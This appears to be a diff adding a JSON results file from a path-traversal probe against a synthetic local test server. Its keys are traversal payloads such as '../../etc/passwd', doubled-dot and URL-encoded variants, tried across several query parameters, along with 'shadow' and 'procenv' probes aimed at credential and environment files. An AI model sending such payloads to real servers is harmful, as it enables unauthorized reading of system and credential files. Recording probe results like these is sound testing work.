@@ -1,0 +1,106 @@
+{
+ "trav/download BASELINE": {
+  "status": 200,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?file=../../etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?file=....//....//etc/pass": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?file=/etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?file=%2e%2e%2f%2e%2e%2fet": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?path=../../etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?path=....//....//etc/pass": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?path=/etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?path=%2e%2e%2f%2e%2e%2fet": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?name=../../etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?name=....//....//etc/pass": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?name=/etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?name=%2e%2e%2f%2e%2e%2fet": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?f=../../etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?f=....//....//etc/pass": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?f=/etc/passwd": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "trav/download?f=%2e%2e%2f%2e%2e%2fet": {
+  "status": 200,
+  "passwd": true,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>"
+ },
+ "shadow": {
+  "status": 200,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>",
+  "headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Thu, 01 Oct 2026 16:46:35 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "59"
+  }
+ },
+ "procenv": {
+  "status": 200,
+  "body": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>",
+  "headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Thu, 01 Oct 2026 16:46:35 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "59"
+  }
+ }
+}
